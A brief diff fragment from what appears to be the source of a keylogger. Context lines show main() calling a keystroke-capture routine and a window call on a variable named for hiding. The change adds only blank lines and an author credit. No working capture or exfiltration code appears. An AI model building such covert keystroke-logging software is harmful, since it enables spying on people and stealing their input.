@@ -14,3 +14,17 @@ int main(void)
 	Keylogger.CapturarTeclas();
 	ShowWindow(ocultar, 1);
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+/*****author -> RayBanBOY******//
